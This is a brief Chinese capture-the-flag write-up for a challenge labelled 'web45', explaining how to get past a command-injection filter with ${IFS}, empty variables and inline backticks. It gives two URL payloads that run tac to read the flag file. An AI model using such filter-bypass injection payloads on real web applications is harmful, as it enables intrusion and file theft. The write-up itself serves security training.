# web45
![](vx_images/374912155968637.png)
用一下内联,或者用${IFS},空变量$*和$@,$s,${s}绕过flag
```
?c=tac${IFS}`ls`%0a
?c=tac$IFS$9fl*%0a//><与通配符不能同时用
```